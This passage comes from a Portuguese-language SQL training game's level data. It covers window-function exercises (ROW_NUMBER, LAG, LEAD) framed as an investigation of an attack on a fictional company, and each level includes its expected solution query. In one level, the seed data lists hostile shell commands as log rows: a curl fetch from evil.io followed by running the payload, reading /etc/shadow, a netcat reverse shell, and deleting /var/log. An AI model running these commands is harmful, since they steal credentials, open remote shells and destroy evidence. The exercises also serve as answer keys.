        explanation: "ROW_NUMBER() e RANK() são funções analíticas que atribuem uma posição numérica a cada linha dentro de um grupo definido por PARTITION BY, seguindo a ordem definida em ORDER BY dentro do OVER(). ROW_NUMBER() sempre gera números únicos e sequenciais (1, 2, 3...), mesmo em caso de empate, enquanto RANK() atribui a mesma posição a valores empatados e pula números na sequência. Esse padrão é ideal para encontrar o 'top 1' (ou top N) de cada grupo, filtrando o resultado por essa posição em uma consulta externa.",
        syntax: "WITH Classificado AS (\n    SELECT coluna1, coluna_grupo, coluna_valor,\n        ROW_NUMBER() OVER (\n            PARTITION BY coluna_grupo\n            ORDER BY coluna_valor DESC, coluna_id ASC\n        ) AS rn\n    FROM tabela\n)\nSELECT coluna1, coluna_grupo, coluna_valor\nFROM Classificado\nWHERE rn = 1;",
        example: "-- Para cada loja, encontrar o produto com maior número de vendas\nWITH RankingVendas AS (\n    SELECT loja_id, produto, unidades_vendidas,\n        ROW_NUMBER() OVER (\n            PARTITION BY loja_id\n            ORDER BY unidades_vendidas DESC, produto_id ASC\n        ) AS rn\n    FROM vendas_mensais\n)\nSELECT loja_id, produto, unidades_vendidas\nFROM RankingVendas\nWHERE rn = 1;"
    },
    schemaDDL: `
        CREATE TABLE terminal_commands (
            command_id INTEGER PRIMARY KEY,
            host_id TEXT NOT NULL,
            command TEXT NOT NULL,
            is_suspicious INTEGER NOT NULL,
            executed_at INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO terminal_commands (command_id, host_id, command, is_suspicious, executed_at) VALUES
        (1, 'HOST-ALPHA', 'whoami', 0, 1000),
        (2, 'HOST-ALPHA', 'curl http://evil.io/payload.sh', 1, 1010),
        (3, 'HOST-ALPHA', 'chmod +x payload.sh', 1, 1020),
        (4, 'HOST-ALPHA', './payload.sh', 1, 1030),
        (5, 'HOST-BRAVO', 'ls -la', 0, 1000),
        (6, 'HOST-BRAVO', 'cat /etc/shadow', 1, 1005),
        (7, 'HOST-BRAVO', 'nc -e /bin/sh 10.0.0.5 4444', 1, 1050),
        (8, 'HOST-CHARLIE', 'ps aux', 0, 900),
        (9, 'HOST-CHARLIE', 'rm -rf /var/log/*', 1, 920),
        (10, 'HOST-DELTA', 'df -h', 0, 800),
        (11, 'HOST-DELTA', 'uptime', 0, 810),
        (12, 'HOST-DELTA', 'who', 0, 820),
        (13, 'HOST-ALPHA', 'echo test', 0, 1040),
        (14, 'HOST-BRAVO', 'id', 0, 1060);
    `,
    expectedQuery: `
        WITH SuspiciousRanked AS (
            SELECT command_id, host_id, command, executed_at,
                ROW_NUMBER() OVER (
                    PARTITION BY host_id
                    ORDER BY executed_at DESC, command_id DESC
                ) AS rn
            FROM terminal_commands
            WHERE is_suspicious = 1
        )
        SELECT host_id, command, executed_at AS ultimo_comando_suspeito
        FROM SuspiciousRanked
        WHERE rn = 1
        ORDER BY host_id ASC;
    `,
    hint: "Filtre is_suspicious = 1 antes de aplicar ROW_NUMBER() OVER (PARTITION BY host_id ORDER BY executed_at DESC, command_id DESC), depois mantenha apenas rn = 1."
},
{
    id: 62,
    tier: "avancado",
    certModule: "ROW_NUMBER() e RANK() — Ordenação por Grupo",
    title: "Nível 62: O Maior Gasto no Exterior",
    briefing: "Uma das contas corporativas da Aethelgard pode estar sendo usada para lavar fundos através de compras internacionais. Maya quer, para cada conta com transações internacionais, isolar a maior delas — o ponto de maior exposição financeira.",
    objective: "Considere apenas transações com is_international = 1. Para cada account_id, encontre a transação de MAIOR amount entre elas. Projete account_id, merchant e amount AS maior_valor_internacional. Exiba apenas contas que possuem ao menos uma transação internacional. Ordene por account_id ASC.",
    theory: {
        title: "Window Functions — ROW_NUMBER() e RANK() com PARTITION BY",
        explanation: "ROW_NUMBER() e RANK() são funções analíticas que atribuem uma posição numérica a cada linha dentro de um grupo definido por PARTITION BY, seguindo a ordem definida em ORDER BY dentro do OVER(). ROW_NUMBER() sempre gera números únicos e sequenciais (1, 2, 3...), mesmo em caso de empate, enquanto RANK() atribui a mesma posição a valores empatados e pula números na sequência. Esse padrão é ideal para encontrar o 'top 1' (ou top N) de cada grupo, filtrando o resultado por essa posição em uma consulta externa.",
        syntax: "WITH Classificado AS (\n    SELECT coluna1, coluna_grupo, coluna_valor,\n        ROW_NUMBER() OVER (\n            PARTITION BY coluna_grupo\n            ORDER BY coluna_valor DESC, coluna_id ASC\n        ) AS rn\n    FROM tabela\n)\nSELECT coluna1, coluna_grupo, coluna_valor\nFROM Classificado\nWHERE rn = 1;",
        example: "-- Para cada loja, encontrar o produto com maior número de vendas\nWITH RankingVendas AS (\n    SELECT loja_id, produto, unidades_vendidas,\n        ROW_NUMBER() OVER (\n            PARTITION BY loja_id\n            ORDER BY unidades_vendidas DESC, produto_id ASC\n        ) AS rn\n    FROM vendas_mensais\n)\nSELECT loja_id, produto, unidades_vendidas\nFROM RankingVendas\nWHERE rn = 1;"
    },
    schemaDDL: `
        CREATE TABLE card_transactions (
            transaction_id INTEGER PRIMARY KEY,
            account_id TEXT NOT NULL,
            merchant TEXT NOT NULL,
            amount REAL NOT NULL,
            is_international INTEGER NOT NULL,
            occurred_at INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO card_transactions (transaction_id, account_id, merchant, amount, is_international, occurred_at) VALUES
        (1, 'ACC-100', 'Amazon', 50.00, 0, 1),
        (2, 'ACC-100', 'Duty Free Paris', 800.00, 1, 2),
        (3, 'ACC-100', 'Hotel Roma', 620.00, 1, 3),
        (4, 'ACC-200', 'Uber', 25.00, 0, 1),
        (5, 'ACC-200', 'Electronics Tokyo', 1500.00, 1, 2),
        (6, 'ACC-200', 'Cafe London', 40.00, 1, 3),
        (7, 'ACC-300', 'Grocery', 90.00, 0, 1),
        (8, 'ACC-300', 'Casino Macau', 3000.00, 1, 2),
        (9, 'ACC-400', 'Local Store', 20.00, 0, 1),
        (10, 'ACC-400', 'Gas Station', 45.00, 0, 2),
        (11, 'ACC-100', 'Airport Duty', 800.00, 1, 4),
        (12, 'ACC-200', 'Duty Free Seoul', 1500.00, 1, 5),
        (13, 'ACC-300', 'Ferry Ticket', 50.00, 1, 3),
        (14, 'ACC-400', 'Something', 15.00, 0, 3);
    `,
    expectedQuery: `
        WITH InternationalRanked AS (
            SELECT transaction_id, account_id, merchant, amount,
                ROW_NUMBER() OVER (
                    PARTITION BY account_id
                    ORDER BY amount DESC, transaction_id ASC
                ) AS rn
            FROM card_transactions
            WHERE is_international = 1
        )
        SELECT account_id, merchant, amount AS maior_valor_internacional
        FROM InternationalRanked
        WHERE rn = 1
        ORDER BY account_id ASC;
    `,
    hint: "Filtre is_international = 1 antes de aplicar ROW_NUMBER() OVER (PARTITION BY account_id ORDER BY amount DESC, transaction_id ASC), depois mantenha apenas rn = 1."
},
{
    id: 63,
    tier: "avancado",
    certModule: "ROW_NUMBER() e RANK() — Ordenação por Grupo",
    title: "Nível 63: O Nível de Acesso Mais Alto",
    briefing: "A escalada de privilégios pode ter partido de dentro. Maya precisa mapear, em cada departamento, qual funcionário ATIVO possui o maior nível de acesso concedido — o suspeito mais provável de ter aberto a porta para o invasor.",
    objective: "Considere apenas funcionários com is_active = 1. Para cada department, encontre o funcionário com o MAIOR access_level entre eles. Projete department, staff_name e access_level AS nivel_maximo_ativo. Exiba apenas departamentos com ao menos um funcionário ativo. Ordene por department ASC.",
    theory: {
        title: "Window Functions — ROW_NUMBER() e RANK() com PARTITION BY",
        explanation: "ROW_NUMBER() e RANK() são funções analíticas que atribuem uma posição numérica a cada linha dentro de um grupo definido por PARTITION BY, seguindo a ordem definida em ORDER BY dentro do OVER(). ROW_NUMBER() sempre gera números únicos e sequenciais (1, 2, 3...), mesmo em caso de empate, enquanto RANK() atribui a mesma posição a valores empatados e pula números na sequência. Esse padrão é ideal para encontrar o 'top 1' (ou top N) de cada grupo, filtrando o resultado por essa posição em uma consulta externa.",
        syntax: "WITH Classificado AS (\n    SELECT coluna1, coluna_grupo, coluna_valor,\n        ROW_NUMBER() OVER (\n            PARTITION BY coluna_grupo\n            ORDER BY coluna_valor DESC, coluna_id ASC\n        ) AS rn\n    FROM tabela\n)\nSELECT coluna1, coluna_grupo, coluna_valor\nFROM Classificado\nWHERE rn = 1;",
        example: "-- Para cada loja, encontrar o produto com maior número de vendas\nWITH RankingVendas AS (\n    SELECT loja_id, produto, unidades_vendidas,\n        ROW_NUMBER() OVER (\n            PARTITION BY loja_id\n            ORDER BY unidades_vendidas DESC, produto_id ASC\n        ) AS rn\n    FROM vendas_mensais\n)\nSELECT loja_id, produto, unidades_vendidas\nFROM RankingVendas\nWHERE rn = 1;"
    },
    schemaDDL: `
        CREATE TABLE staff_access (
            staff_id INTEGER PRIMARY KEY,
            department TEXT NOT NULL,
            staff_name TEXT NOT NULL,
            access_level INTEGER NOT NULL,
            is_active INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO staff_access (staff_id, department, staff_name, access_level, is_active) VALUES
        (1, 'TI', 'Bruno Silva', 5, 1),
        (2, 'TI', 'Carla Nunes', 8, 1),
        (3, 'TI', 'Diego Alves', 9, 0),
        (4, 'FINANCEIRO', 'Elisa Cruz', 6, 1),
        (5, 'FINANCEIRO', 'Fabio Rocha', 6, 1),
        (6, 'FINANCEIRO', 'Gustavo Melo', 3, 0),
        (7, 'RH', 'Helena Dias', 4, 1),
        (8, 'RH', 'Igor Lima', 2, 1),
        (9, 'SEGURANCA', 'Julia Freitas', 10, 0),
        (10, 'SEGURANCA', 'Kleber Souza', 9, 0),
        (11, 'TI', 'Livia Rangel', 8, 1),
        (12, 'FINANCEIRO', 'Marcos Tavares', 2, 1),
        (13, 'RH', 'Nadia Prado', 4, 0),
        (14, 'TI', 'Otavio Reis', 1, 1);
    `,
    expectedQuery: `
        WITH ActiveRanked AS (
            SELECT staff_id, department, staff_name, access_level,
                ROW_NUMBER() OVER (
                    PARTITION BY department
                    ORDER BY access_level DESC, staff_id ASC
                ) AS rn
            FROM staff_access
            WHERE is_active = 1
        )
        SELECT department, staff_name, access_level AS nivel_maximo_ativo
        FROM ActiveRanked
        WHERE rn = 1
        ORDER BY department ASC;
    `,
    hint: "Filtre is_active = 1 antes de aplicar ROW_NUMBER() OVER (PARTITION BY department ORDER BY access_level DESC, staff_id ASC), depois mantenha apenas rn = 1."
},
{
    id: 64,
    tier: "avancado",
    certModule: "ROW_NUMBER() e RANK() — Ordenação por Grupo",
    title: "Nível 64: O Pico Térmico Crítico",
    briefing: "Sensores industriais da planta da Aethelgard registraram anomalias térmicas suspeitas — possível sabotagem física combinada ao ataque digital. Maya precisa da leitura mais crítica de cada sensor que disparou alarme.",
    objective: "Considere apenas leituras com is_anomaly = 1. Para cada sensor_id, encontre a leitura com a MAIOR temperature entre elas. Projete sensor_id, temperature AS temperatura_critica e reading_time AS registrado_em. Exiba apenas sensores que possuem ao menos uma anomalia registrada. Ordene por sensor_id ASC.",
    theory: {
        title: "Window Functions — ROW_NUMBER() e RANK() com PARTITION BY",
        explanation: "ROW_NUMBER() e RANK() são funções analíticas que atribuem uma posição numérica a cada linha dentro de um grupo definido por PARTITION BY, seguindo a ordem definida em ORDER BY dentro do OVER(). ROW_NUMBER() sempre gera números únicos e sequenciais (1, 2, 3...), mesmo em caso de empate, enquanto RANK() atribui a mesma posição a valores empatados e pula números na sequência. Esse padrão é ideal para encontrar o 'top 1' (ou top N) de cada grupo, filtrando o resultado por essa posição em uma consulta externa.",
        syntax: "WITH Classificado AS (\n    SELECT coluna1, coluna_grupo, coluna_valor,\n        ROW_NUMBER() OVER (\n            PARTITION BY coluna_grupo\n            ORDER BY coluna_valor DESC, coluna_id ASC\n        ) AS rn\n    FROM tabela\n)\nSELECT coluna1, coluna_grupo, coluna_valor\nFROM Classificado\nWHERE rn = 1;",
        example: "-- Para cada loja, encontrar o produto com maior número de vendas\nWITH RankingVendas AS (\n    SELECT loja_id, produto, unidades_vendidas,\n        ROW_NUMBER() OVER (\n            PARTITION BY loja_id\n            ORDER BY unidades_vendidas DESC, produto_id ASC\n        ) AS rn\n    FROM vendas_mensais\n)\nSELECT loja_id, produto, unidades_vendidas\nFROM RankingVendas\nWHERE rn = 1;"
    },
    schemaDDL: `
        CREATE TABLE iot_readings (
            reading_id INTEGER PRIMARY KEY,
            sensor_id TEXT NOT NULL,
            temperature REAL NOT NULL,
            is_anomaly INTEGER NOT NULL,
            reading_time INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO iot_readings (reading_id, sensor_id, temperature, is_anomaly, reading_time) VALUES
        (1, 'SENSOR-01', 22.5, 0, 1),
        (2, 'SENSOR-01', 95.0, 1, 2),
        (3, 'SENSOR-01', 88.0, 1, 3),
        (4, 'SENSOR-02', 20.0, 0, 1),
        (5, 'SENSOR-02', 101.2, 1, 2),
        (6, 'SENSOR-03', 19.8, 0, 1),
        (7, 'SENSOR-03', 77.0, 1, 2),
        (8, 'SENSOR-03', 77.0, 1, 3),
        (9, 'SENSOR-04', 21.0, 0, 1),
        (10, 'SENSOR-04', 22.0, 0, 2),
        (11, 'SENSOR-01', 95.0, 1, 4),
        (12, 'SENSOR-02', 50.0, 1, 3),
        (13, 'SENSOR-03', 15.0, 0, 3),
        (14, 'SENSOR-04', 23.5, 0, 3);
    `,
    expectedQuery: `
        WITH AnomalyRanked AS (
            SELECT reading_id, sensor_id, temperature, reading_time,
                ROW_NUMBER() OVER (
                    PARTITION BY sensor_id
                    ORDER BY temperature DESC, reading_id ASC
                ) AS rn
            FROM iot_readings
            WHERE is_anomaly = 1
        )
        SELECT sensor_id, temperature AS temperatura_critica, reading_time AS registrado_em
        FROM AnomalyRanked
        WHERE rn = 1
        ORDER BY sensor_id ASC;
    `,
    hint: "Filtre is_anomaly = 1 antes de aplicar ROW_NUMBER() OVER (PARTITION BY sensor_id ORDER BY temperature DESC, reading_id ASC), depois mantenha apenas rn = 1."
},
{
    id: 65,
    tier: "avancado",
    certModule: "ROW_NUMBER() e RANK() — Ordenação por Grupo",
    title: "Nível 65: A Carga Sob Inspeção",
    briefing: "A cadeia de fornecedores da Aethelgard está sob suspeita de superfaturamento. Maya quer, para cada fornecedor com remessas em inspeção pendente, identificar a carga de maior valor declarado — o caso mais grave a ser investigado primeiro.",
    objective: "Considere apenas remessas com status = 'INSPECAO_PENDENTE'. Para cada supplier_id, encontre a remessa com o MAIOR cargo_value entre elas. Projete supplier_id, cargo_value AS maior_carga_em_inspecao e shipped_at AS data_envio. Exiba apenas fornecedores com ao menos uma remessa em inspeção. Ordene por supplier_id ASC.",
    theory: {
        title: "Window Functions — ROW_NUMBER() e RANK() com PARTITION BY",
        explanation: "ROW_NUMBER() e RANK() são funções analíticas que atribuem uma posição numérica a cada linha dentro de um grupo definido por PARTITION BY, seguindo a ordem definida em ORDER BY dentro do OVER(). ROW_NUMBER() sempre gera números únicos e sequenciais (1, 2, 3...), mesmo em caso de empate, enquanto RANK() atribui a mesma posição a valores empatados e pula números na sequência. Esse padrão é ideal para encontrar o 'top 1' (ou top N) de cada grupo, filtrando o resultado por essa posição em uma consulta externa.",
        syntax: "WITH Classificado AS (\n    SELECT coluna1, coluna_grupo, coluna_valor,\n        ROW_NUMBER() OVER (\n            PARTITION BY coluna_grupo\n            ORDER BY coluna_valor DESC, coluna_id ASC\n        ) AS rn\n    FROM tabela\n)\nSELECT coluna1, coluna_grupo, coluna_valor\nFROM Classificado\nWHERE rn = 1;",
        example: "-- Para cada loja, encontrar o produto com maior número de vendas\nWITH RankingVendas AS (\n    SELECT loja_id, produto, unidades_vendidas,\n        ROW_NUMBER() OVER (\n            PARTITION BY loja_id\n            ORDER BY unidades_vendidas DESC, produto_id ASC\n        ) AS rn\n    FROM vendas_mensais\n)\nSELECT loja_id, produto, unidades_vendidas\nFROM RankingVendas\nWHERE rn = 1;"
    },
    schemaDDL: `
        CREATE TABLE shipments_log (
            shipment_id INTEGER PRIMARY KEY,
            supplier_id TEXT NOT NULL,
            cargo_value REAL NOT NULL,
            status TEXT NOT NULL,
            shipped_at INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO shipments_log (shipment_id, supplier_id, cargo_value, status, shipped_at) VALUES
        (1, 'FORN-01', 5000, 'ENTREGUE', 1),
        (2, 'FORN-01', 12000, 'INSPECAO_PENDENTE', 2),
        (3, 'FORN-01', 9000, 'INSPECAO_PENDENTE', 3),
        (4, 'FORN-02', 3000, 'ENTREGUE', 1),
        (5, 'FORN-02', 25000, 'INSPECAO_PENDENTE', 2),
        (6, 'FORN-03', 7000, 'ENTREGUE', 1),
        (7, 'FORN-03', 15000, 'INSPECAO_PENDENTE', 2),
        (8, 'FORN-03', 15000, 'INSPECAO_PENDENTE', 3),
        (9, 'FORN-04', 4000, 'ENTREGUE', 1),
        (10, 'FORN-04', 6000, 'ENTREGUE', 2),
        (11, 'FORN-01', 12000, 'INSPECAO_PENDENTE', 4),
        (12, 'FORN-02', 8000, 'INSPECAO_PENDENTE', 3),
        (13, 'FORN-03', 2000, 'ENTREGUE', 3),
        (14, 'FORN-04', 5500, 'ENTREGUE', 3);
    `,
    expectedQuery: `
        WITH PendingRanked AS (
            SELECT shipment_id, supplier_id, cargo_value, shipped_at,
                ROW_NUMBER() OVER (
                    PARTITION BY supplier_id
                    ORDER BY cargo_value DESC, shipment_id ASC
                ) AS rn
            FROM shipments_log
            WHERE status = 'INSPECAO_PENDENTE'
        )
        SELECT supplier_id, cargo_value AS maior_carga_em_inspecao, shipped_at AS data_envio
        FROM PendingRanked
        WHERE rn = 1
        ORDER BY supplier_id ASC;
    `,
    hint: "Filtre status = 'INSPECAO_PENDENTE' antes de aplicar ROW_NUMBER() OVER (PARTITION BY supplier_id ORDER BY cargo_value DESC, shipment_id ASC), depois mantenha apenas rn = 1."
},
{
    id: 66,
    tier: "avancado",
    certModule: "LAG() e LEAD() — Comparando Linhas Vizinhas",
    title: "Nível 66: Tentativas em Cascata",
    briefing: "O sistema de autenticação da Aethelgard registrou rajadas de tentativas de acesso. Maya suspeita de um script automatizado testando credenciais e precisa localizar toda tentativa seguida por outra em menos de 4 segundos, do mesmo usuário.",
    objective: "Utilize LEAD para obter o horário da PRÓXIMA tentativa de acesso do mesmo user_id (ordenado por attempted_at ASC, com attempt_id ASC como desempate). Calcule a diferença em segundos até essa próxima tentativa como intervalo_proximo. Projete attempt_id, user_id, attempted_at e intervalo_proximo. Exiba apenas linhas onde intervalo_proximo não for nulo e for menor ou igual a 3. Ordene por user_id ASC e attempt_id ASC.",
    theory: {
        title: "Window Functions — LAG() e LEAD() (Linhas Vizinhas)",
        explanation: "LAG() e LEAD() são funções analíticas que trazem o valor de outra linha para dentro da linha atual, sem precisar de um JOIN. LAG(coluna) acessa a linha ANTERIOR dentro da mesma partição (definida por PARTITION BY) e ORDER BY; LEAD(coluna) acessa a linha SEGUINTE. Isso é essencial para comparar um evento com o que veio antes ou depois dele na mesma sequência, como calcular o tempo decorrido entre dois eventos consecutivos.",
        syntax: "SELECT coluna_id, coluna_grupo, coluna_tempo,\n    LAG(coluna_tempo) OVER (\n        PARTITION BY coluna_grupo\n        ORDER BY coluna_tempo ASC, coluna_id ASC\n    ) AS valor_anterior,\n    LEAD(coluna_tempo) OVER (\n        PARTITION BY coluna_grupo\n        ORDER BY coluna_tempo ASC, coluna_id ASC\n    ) AS valor_seguinte\nFROM tabela;",
        example: "-- Para cada máquina, mostrar o tempo até a próxima manutenção registrada\nSELECT maquina_id, manutencao_id, realizada_em,\n    LEAD(realizada_em) OVER (\n        PARTITION BY maquina_id\n        ORDER BY realizada_em ASC, manutencao_id ASC\n    ) - realizada_em AS dias_ate_proxima\nFROM manutencoes;"
    },
    schemaDDL: `
        CREATE TABLE access_attempts (
            attempt_id INTEGER PRIMARY KEY,
            user_id TEXT NOT NULL,
            source_ip TEXT NOT NULL,
            attempted_at INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO access_attempts (attempt_id, user_id, source_ip, attempted_at) VALUES
        (1, 'USR-01', '203.0.113.10', 1000),
        (2, 'USR-01', '203.0.113.10', 1002),
        (3, 'USR-01', '203.0.113.10', 1050),
        (4, 'USR-01', '203.0.113.10', 1052),
        (5, 'USR-02', '198.51.100.22', 2000),
        (6, 'USR-02', '198.51.100.22', 2100),
        (7, 'USR-02', '198.51.100.22', 2101),
        (8, 'USR-03', '192.0.2.9', 3000),
        (9, 'USR-03', '192.0.2.9', 3100),
        (10, 'USR-03', '192.0.2.9', 3300),
        (11, 'USR-04', '192.0.2.44', 4000),
        (12, 'USR-04', '192.0.2.44', 4001),
        (13, 'USR-04', '192.0.2.44', 4090),
        (14, 'USR-02', '198.51.100.22', 2102);
    `,
    expectedQuery: `
        WITH NextAttempt AS (
            SELECT attempt_id, user_id, attempted_at,
                LEAD(attempted_at) OVER (
                    PARTITION BY user_id
                    ORDER BY attempted_at ASC, attempt_id ASC
                ) - attempted_at AS intervalo_proximo
            FROM access_attempts
        )
        SELECT attempt_id, user_id, attempted_at, intervalo_proximo
        FROM NextAttempt
        WHERE intervalo_proximo IS NOT NULL AND intervalo_proximo <= 3
        ORDER BY user_id ASC, attempt_id ASC;
    `,
    hint: "Empregue LEAD(attempted_at) OVER (PARTITION BY user_id ORDER BY attempted_at ASC, attempt_id ASC) dentro de uma CTE, subtraia attempted_at, e filtre o resultado com <= 3."
},
{
    id: 67,
    tier: "avancado",
    certModule: "LAG() e LEAD() — Comparando Linhas Vizinhas",
    title: "Nível 67: A Queda Repentina de Saldo",
    briefing: "Os registros de saldo de várias contas corporativas mostram quedas abruptas que não batem com o histórico de despesas normais. Maya precisa localizar cada snapshot onde o saldo despencou 1000 ou mais em relação ao snapshot anterior da mesma conta.",
    objective: "Utilize LAG para obter o balance do snapshot ANTERIOR do mesmo account_id (ordenado por snapshot_at ASC, com snapshot_id ASC como desempate). Calcule a queda como (valor anterior menos balance atual) e projete-a como queda_valor. Projete snapshot_id, account_id, balance e queda_valor. Exiba apenas linhas onde queda_valor não for nulo e for maior ou igual a 1000. Ordene por account_id ASC e snapshot_id ASC.",
    theory: {
        title: "Window Functions — LAG() e LEAD() (Linhas Vizinhas)",
        explanation: "LAG() e LEAD() são funções analíticas que trazem o valor de outra linha para dentro da linha atual, sem precisar de um JOIN. LAG(coluna) acessa a linha ANTERIOR dentro da mesma partição (definida por PARTITION BY) e ORDER BY; LEAD(coluna) acessa a linha SEGUINTE. Isso é essencial para comparar um evento com o que veio antes ou depois dele na mesma sequência, como calcular o tempo decorrido entre dois eventos consecutivos.",
        syntax: "SELECT coluna_id, coluna_grupo, coluna_tempo,\n    LAG(coluna_tempo) OVER (\n        PARTITION BY coluna_grupo\n        ORDER BY coluna_tempo ASC, coluna_id ASC\n    ) AS valor_anterior,\n    LEAD(coluna_tempo) OVER (\n        PARTITION BY coluna_grupo\n        ORDER BY coluna_tempo ASC, coluna_id ASC\n    ) AS valor_seguinte\nFROM tabela;",
        example: "-- Para cada máquina, mostrar o tempo até a próxima manutenção registrada\nSELECT maquina_id, manutencao_id, realizada_em,\n    LEAD(realizada_em) OVER (\n        PARTITION BY maquina_id\n        ORDER BY realizada_em ASC, manutencao_id ASC\n    ) - realizada_em AS dias_ate_proxima\nFROM manutencoes;"
    },
    schemaDDL: `
        CREATE TABLE account_balance_snapshots (
            snapshot_id INTEGER PRIMARY KEY,
            account_id TEXT NOT NULL,
            balance REAL NOT NULL,
            snapshot_at INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO account_balance_snapshots (snapshot_id, account_id, balance, snapshot_at) VALUES
        (1, 'ACC-A', 10000, 1),
        (2, 'ACC-A', 8500, 2),
        (3, 'ACC-A', 8400, 3),
        (4, 'ACC-A', 3000, 4),
        (5, 'ACC-B', 5000, 1),
        (6, 'ACC-B', 5050, 2),
        (7, 'ACC-B', 3900, 3),
        (8, 'ACC-B', 3950, 4),
        (9, 'ACC-C', 20000, 1),
        (10, 'ACC-C', 18000, 2),
        (11, 'ACC-C', 17500, 3),
        (12, 'ACC-D', 1000, 1),
        (13, 'ACC-D', 1100, 2),
        (14, 'ACC-D', 1200, 3);
    `,
    expectedQuery: `
        WITH BalanceDelta AS (
            SELECT snapshot_id, account_id, balance,
                LAG(balance) OVER (
                    PARTITION BY account_id
                    ORDER BY snapshot_at ASC, snapshot_id ASC
                ) - balance AS queda_valor
            FROM account_balance_snapshots
        )
        SELECT snapshot_id, account_id, balance, queda_valor
        FROM BalanceDelta
        WHERE queda_valor IS NOT NULL AND queda_valor >= 1000
        ORDER BY account_id ASC, snapshot_id ASC;
    `,
    hint: "Empregue LAG(balance) OVER (PARTITION BY account_id ORDER BY snapshot_at ASC, snapshot_id ASC) dentro de uma CTE, subtraia balance do valor anterior, e filtre o resultado com >= 1000."
},
{
    id: 68,
    tier: "avancado",
    certModule: "LAG() e LEAD() — Comparando Linhas Vizinhas",
    title: "Nível 68: O Arquivo que Encolheu",
    briefing: "No repositório de documentos confidenciais, alguns arquivos tiveram seu tamanho reduzido drasticamente entre uma versão e outra — um possível indício de exclusão seletiva de conteúdo pelo invasor. Maya precisa localizar cada encolhimento suspeito.",
    objective: "Utilize LAG para obter o file_size_kb da versão ANTERIOR do mesmo document_id (ordenado por saved_at ASC, com version_id ASC como desempate). Calcule a variação como (file_size_kb atual menos o tamanho anterior) e projete-a como variacao_tamanho. Projete version_id, document_id, file_size_kb e variacao_tamanho. Exiba apenas linhas onde variacao_tamanho não for nulo e for menor ou igual a -500. Ordene por document_id ASC e version_id ASC.",
    theory: {
        title: "Window Functions — LAG() e LEAD() (Linhas Vizinhas)",
        explanation: "LAG() e LEAD() são funções analíticas que trazem o valor de outra linha para dentro da linha atual, sem precisar de um JOIN. LAG(coluna) acessa a linha ANTERIOR dentro da mesma partição (definida por PARTITION BY) e ORDER BY; LEAD(coluna) acessa a linha SEGUINTE. Isso é essencial para comparar um evento com o que veio antes ou depois dele na mesma sequência, como calcular o tempo decorrido entre dois eventos consecutivos.",
        syntax: "SELECT coluna_id, coluna_grupo, coluna_tempo,\n    LAG(coluna_tempo) OVER (\n        PARTITION BY coluna_grupo\n        ORDER BY coluna_tempo ASC, coluna_id ASC\n    ) AS valor_anterior,\n    LEAD(coluna_tempo) OVER (\n        PARTITION BY coluna_grupo\n        ORDER BY coluna_tempo ASC, coluna_id ASC\n    ) AS valor_seguinte\nFROM tabela;",
        example: "-- Para cada máquina, mostrar o tempo até a próxima manutenção registrada\nSELECT maquina_id, manutencao_id, realizada_em,\n    LEAD(realizada_em) OVER (\n        PARTITION BY maquina_id\n        ORDER BY realizada_em ASC, manutencao_id ASC\n    ) - realizada_em AS dias_ate_proxima\nFROM manutencoes;"
    },
    schemaDDL: `
        CREATE TABLE document_versions (
            version_id INTEGER PRIMARY KEY,
            document_id TEXT NOT NULL,
            file_size_kb REAL NOT NULL,
            saved_at INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO document_versions (version_id, document_id, file_size_kb, saved_at) VALUES
        (1, 'DOC-100', 1200, 1),
        (2, 'DOC-100', 1250, 2),
        (3, 'DOC-100', 400, 3),
        (4, 'DOC-100', 420, 4),
        (5, 'DOC-200', 800, 1),
        (6, 'DOC-200', 250, 2),
        (7, 'DOC-200', 260, 3),
        (8, 'DOC-300', 3000, 1),
        (9, 'DOC-300', 3100, 2),
        (10, 'DOC-300', 3050, 3),
        (11, 'DOC-300', 100, 4),
        (12, 'DOC-400', 500, 1),
        (13, 'DOC-400', 520, 2),
        (14, 'DOC-400', 540, 3);
    `,
    expectedQuery: `
        WITH VersionDelta AS (
            SELECT version_id, document_id, file_size_kb,
                file_size_kb - LAG(file_size_kb) OVER (
                    PARTITION BY document_id
                    ORDER BY saved_at ASC, version_id ASC
                ) AS variacao_tamanho
            FROM document_versions
        )
        SELECT version_id, document_id, file_size_kb, variacao_tamanho
        FROM VersionDelta
        WHERE variacao_tamanho IS NOT NULL AND variacao_tamanho <= -500
        ORDER BY document_id ASC, version_id ASC;
    `,
    hint: "Empregue LAG(file_size_kb) OVER (PARTITION BY document_id ORDER BY saved_at ASC, version_id ASC) dentro de uma CTE, calcule file_size_kb menos o valor anterior, e filtre o resultado com <= -500."
},
{
    id: 69,
    tier: "avancado",
    certModule: "LAG() e LEAD() — Comparando Linhas Vizinhas",
    title: "Nível 69: Respostas Rápidas Demais",
    briefing: "Interceptações de mensagens entre contatos suspeitos revelam trocas com tempo de resposta anormalmente curto — indício de comunicação coordenada em tempo real durante o ataque. Maya precisa isolar cada mensagem seguida por outra do mesmo remetente em 10 segundos ou menos.",
    objective: "Utilize LEAD para obter o sent_at da PRÓXIMA mensagem do mesmo sender_id (ordenado por sent_at ASC, com message_id ASC como desempate). Calcule a diferença em segundos até essa próxima mensagem como intervalo_resposta. Projete message_id, sender_id, content e intervalo_resposta. Exiba apenas linhas onde intervalo_resposta não for nulo e for menor ou igual a 10. Ordene por sender_id ASC e message_id ASC.",
    theory: {
        title: "Window Functions — LAG() e LEAD() (Linhas Vizinhas)",
        explanation: "LAG() e LEAD() são funções analíticas que trazem o valor de outra linha para dentro da linha atual, sem precisar de um JOIN. LAG(coluna) acessa a linha ANTERIOR dentro da mesma partição (definida por PARTITION BY) e ORDER BY; LEAD(coluna) acessa a linha SEGUINTE. Isso é essencial para comparar um evento com o que veio antes ou depois dele na mesma sequência, como calcular o tempo decorrido entre dois eventos consecutivos.",
        syntax: "SELECT coluna_id, coluna_grupo, coluna_tempo,\n    LAG(coluna_tempo) OVER (\n        PARTITION BY coluna_grupo\n        ORDER BY coluna_tempo ASC, coluna_id ASC\n    ) AS valor_anterior,\n    LEAD(coluna_tempo) OVER (\n        PARTITION BY coluna_grupo\n        ORDER BY coluna_tempo ASC, coluna_id ASC\n    ) AS valor_seguinte\nFROM tabela;",
